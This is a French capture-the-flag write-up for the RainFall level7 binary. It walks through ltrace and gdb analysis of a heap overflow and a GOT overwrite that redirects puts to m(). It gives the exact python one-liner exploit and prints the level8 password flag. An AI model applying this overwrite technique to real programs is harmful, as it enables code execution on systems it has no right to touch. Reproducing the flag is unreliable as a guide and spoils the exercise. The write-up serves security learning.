Dans ce niveau on a l'executable `level7` qui prend 2 params avec une fonction `m()`

Le main contient 4 malloc(8), on voit les adresses et nos infos avec: `ltrace ./level7 AAAA BBBBB`

```sh
level7@RainFall:~$ ltrace ./level7 AAAA BBBBB
__libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                               = 0x0804a008
malloc(8)                               = 0x0804a018
malloc(8)                               = 0x0804a028
malloc(8)                               = 0x0804a038
strcpy(0x0804a018, "AAAA")              = 0x0804a018
strcpy(0x0804a038, "BBBBB")             = 0x0804a038
fopen("/home/user/level8/.pass", "r")   = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

On peut voir les adresses des malloc ainsi que ce que cherche a copier `strcpy()`

On va donc anayser la memoire apres les copies en se placant avant `le fopen()`:

```sh
(gdb) r AAAAAA BBBBBB
Starting program: /home/user/level7/level7 AAAAAA BBBBBB

Breakpoint 1, 0x080485d3 in main ()
(gdb) x/18x 0x0804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x41414141	0x00004141	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
0x804a038:	0x42424242	0x00004242	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000
```
On voit que a `0x804a018 + 24(0x18) = 0x0804a038` qui est un pointeur sur le deuxieme arg copie

L'overflow se fait donc avec 24 char (on fera 20 + adresse)
 
La fonciton `m()` qui permet de `printf` ce que `gets()` a copie dans le main sur `0x8049960`

main():
```sh
0x080485e4 <+195>:	movl   $0x8049960,(%esp)
0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
```

m():
```sh
0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
0x08048517 <+35>:	mov    %edx,(%esp)
0x0804851a <+38>:	call   0x80483b0 <printf@plt>
```

Plus tard on voit on voit un appel a `0x080485f7 <+214>:	call   0x8048400 <puts@plt>` on va s'en servir

Notre objectif va etre de creer un overflow et remplacer le pointeur `0x0804a038` par l'adresse de `puts`

Puis d'appeler `m()` en remplacant l'adresse de `puts` par celle de `m()`

On va recuperer sont adresse GOT avec `objdump -R ./level7 | grep puts`:
    `08049928 R_386_JUMP_SLOT   puts`

Adresse GOT de puts = 0x08049928 = `\x28\x99\x04\x08`

Adresse de m() = 0x080484f4 = `\xf4\x84\x04\x08`

A l'aide de ce script on va pouvoir declencher m() qui va printf ce que lit `gets()` depuis le fichier ouvert par `fopen()`:
    `(python -c 'print "A"*20 + "\x28\x99\x04\x08"'; python -c 'print "\xf4\x84\x04\x08"') | xargs ./level7`

Le flag sort car fopen() a ouvert `fopen("/home/user/level8/.pass", "r")`:
    `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`